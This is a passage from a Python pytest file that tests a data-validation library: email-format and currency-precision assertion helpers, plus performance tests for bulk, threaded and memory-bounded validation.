        assert_helpers.assert_sanitized_html(sanitized, dangerous_html)
    
    def test_assert_helpers_email_format(self, assert_helpers):
        """Test assert helpers for email format validation."""
        valid_email = 'test@example.com'
        assert_helpers.assert_valid_email_format(valid_email)
        
        # Test invalid email assertion would fail
        with pytest.raises(AssertionError):
            assert_helpers.assert_valid_email_format('invalid-email')
    
    def test_assert_helpers_currency_precision(self, assert_helpers):
        """Test assert helpers for currency precision validation."""
        # Test valid precision
        usd_amount = Decimal('99.99')
        assert_helpers.assert_currency_precision(usd_amount, 'USD')
        
        jpy_amount = Decimal('100')  # No decimal places
        assert_helpers.assert_currency_precision(jpy_amount, 'JPY')
        
        # Test invalid precision would fail
        with pytest.raises(AssertionError):
            invalid_usd = Decimal('99.999')  # Too many decimal places for USD
            assert_helpers.assert_currency_precision(invalid_usd, 'USD')


# ============================================================================
# PERFORMANCE AND STRESS TESTS
# ============================================================================

@pytest.mark.performance
class TestValidationPerformance:
    """Performance tests for validation systems ensuring ≤10% variance requirement."""
    
    def test_large_dataset_validation_performance(self, large_dataset, performance_timer, test_config):
        """Test validation performance with large datasets."""
        class PerformanceValidator(DataModelValidator):
            id = fields.Integer(required=True)
            name = fields.String(required=True)
            value = fields.String()
            metadata = fields.Dict()
        
        # Use all 1000 items from large dataset
        test_items = list(large_dataset.values())
        
        performance_timer.start()
        
        validated_count = 0
        errors_count = 0
        
        for item in test_items:
            try:
                validator = PerformanceValidator()
                result = validator.load_with_context(item)
                validated_count += 1
            except DataValidationError:
                errors_count += 1
        
        performance_timer.stop()
        
        # Performance requirement: should handle 1000 validations in under 5 seconds
        performance_timer.assert_duration_under(5.0)
        
        # Verify high success rate
        success_rate = validated_count / len(test_items)
        assert success_rate > 0.95  # At least 95% success rate
        
        print(f"Validated {validated_count} items with {errors_count} errors in {performance_timer.duration:.3f}s")
    
    def test_concurrent_validation_simulation(self, performance_timer, test_config):
        """Test validation performance under concurrent load simulation."""
        import threading
        import queue
        
        class ConcurrentValidator(InputValidator):
            username = fields.String(required=True)
            email = fields.Email(required=True)
            password = fields.String(required=True)
        
        # Create test data
        test_data = [
            {
                'username': f'user_{i}',
                'email': f'user_{i}@example.com',
                'password': f'Password{i}!'
            }
            for i in range(100)
        ]
        
        results_queue = queue.Queue()
        
        def validate_worker(data_chunk):
            """Worker function for concurrent validation."""
            validator = ConcurrentValidator(enable_sanitization=True)
            chunk_results = []
            
            for item in data_chunk:
                try:
                    result = validator.load_with_context(item)
                    chunk_results.append(('success', result))
                except Exception as e:
                    chunk_results.append(('error', str(e)))
            
            results_queue.put(chunk_results)
        
        # Split data into chunks for concurrent processing
        chunk_size = 20
        chunks = [test_data[i:i + chunk_size] for i in range(0, len(test_data), chunk_size)]
        
        performance_timer.start()
        
        # Create and start threads
        threads = []
        for chunk in chunks:
            thread = threading.Thread(target=validate_worker, args=(chunk,))
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        performance_timer.stop()
        
        # Collect results
        total_results = []
        while not results_queue.empty():
            chunk_results = results_queue.get()
            total_results.extend(chunk_results)
        
        # Performance requirement
        performance_timer.assert_duration_under(3.0)  # Should complete in under 3 seconds
        
        # Verify results
        success_count = sum(1 for result_type, _ in total_results if result_type == 'success')
        assert success_count == len(test_data)  # All should succeed
        
        print(f"Concurrent validation: {len(test_data)} items in {performance_timer.duration:.3f}s using {len(chunks)} threads")
    
    def test_memory_usage_validation(self, large_dataset, test_config):
        """Test memory usage during extensive validation operations."""
        import gc
        import sys
        
        class MemoryValidator(DataModelValidator):
            id = fields.Integer(required=True)
            name = fields.String(required=True)
            value = fields.String()
            metadata = fields.Dict()
            tags = fields.List(fields.String())
        
        # Get initial memory usage
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Process large dataset
        test_items = list(large_dataset.values())
        validated_items = []
        
        for item in test_items:
            try:
                validator = MemoryValidator()
                result = validator.load_with_context(item)
                validated_items.append(result)
            except Exception:
                pass
        
        # Force garbage collection
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Memory usage should not grow excessively
        object_growth = final_objects - initial_objects
        growth_ratio = object_growth / initial_objects
        
        # Should not increase object count by more than 50%
        assert growth_ratio < 0.5, f"Memory usage grew by {growth_ratio:.2%}"
        
        print(f"Memory test: Processed {len(test_items)} items, object count grew by {object_growth} ({growth_ratio:.2%})")


if __name__ == "__main__":
    # Run tests with coverage
    pytest.main([
        __file__,
        "-v",
        "--cov=src/business/validators",
        "--cov=src/business/models", 
        "--cov=src/auth/utils",
        "--cov-report=html",
        "--cov-report=term-missing",
        "--cov-fail-under=90"
    ])